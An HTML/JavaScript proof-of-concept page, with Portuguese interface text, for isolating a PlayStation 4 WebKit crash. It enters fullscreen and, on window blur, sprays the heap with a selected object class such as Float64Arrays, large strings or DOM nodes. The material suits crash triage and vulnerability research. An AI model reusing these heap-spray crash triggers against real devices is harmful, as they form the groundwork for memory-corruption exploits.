
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>PS4 WebKit Fullscreen + Blur Crash — Class Isolation PoC</title>
    <style>
        body {
            font-family: monospace;
            background: #000;
            color: #0f0;
            padding: 20px;
        }
        button, select {
            font-size: 16px;
            padding: 8px;
            margin: 5px 0;
        }
        .warn {
            color: #ff0;
            margin-top: 10px;
        }
        .danger {
            color: #f00;
            font-weight: bold;
        }
    </style>
</head>
<body>

<h1>PS4 WebKit Crash — Heap Class Isolation</h1>

<p>
Fluxo obrigatório:<br>
1. RUN TEST<br>
2. OPTIONS (Blur)<br>
3. REFRESH
</p>

<label>Classe em teste:</label><br>
<select id="mode">
    <option value="none">Nenhum (controle)</option>
    <option value="arrays">Float64Array</option>
    <option value="strings">Strings grandes</option>
    <option value="objects">Objetos JS simples</option>
    <option value="closures">Closures / funções</option>
    <option value="dom">DOM Nodes</option>
    <option value="listeners">Event listeners</option>
</select>

<br>
<button onclick="fire()">RUN TEST</button>

<p id="status" class="warn"></p>

<script>
let heap = [];

function fire() {
    heap = [];
    document.getElementById("status").innerText =
        "Fullscreen ativo. Aperte OPTIONS e depois REFRESH.";

    const el = document.documentElement;
    if (el.webkitRequestFullscreen) el.webkitRequestFullscreen();
    else if (el.requestFullscreen) el.requestFullscreen();

    window.onblur = function () {
        const mode = document.getElementById("mode").value;
        console.log("[*] Blur detected. Mode:", mode);

        try {
            switch (mode) {

                case "arrays":
                    for (let i = 0; i < 10000; i++) {
                        heap.push(new Float64Array(32));
                    }
                    break;

                case "strings":
                    for (let i = 0; i < 5000; i++) {
                        heap.push("A".repeat(100000));
                    }
                    break;

                case "objects":
                    for (let i = 0; i < 10000; i++) {
                        heap.push({ a: i, b: "test", c: { x: i } });
                    }
                    break;

                case "closures":
                    for (let i = 0; i < 8000; i++) {
                        let x = i;
                        heap.push(function () { return x; });
                    }
                    break;

                case "dom":
                    for (let i = 0; i < 3000; i++) {
                        let d = document.createElement("div");
                        d.textContent = "NODE " + i;
                        document.body.appendChild(d);
                        heap.push(d);
                    }
                    break;

                case "listeners":
                    for (let i = 0; i < 5000; i++) {
                        let b = document.createElement("button");
                        b.onclick = function () {};
                        document.body.appendChild(b);
                        heap.push(b);
                    }
                    break;

                case "none":
                default:
                    // Controle: nada é alocado
                    break;
            }

            window.keep_alive = heap;

        } catch (e) {
            console.log("Allocation error:", e);
        }

        document.getElementById("status").innerHTML =
            "<span class='danger'>AGORA: escolha REFRESH no menu OPTIONS</span>";
    };
}
</script>

</body>
</html>
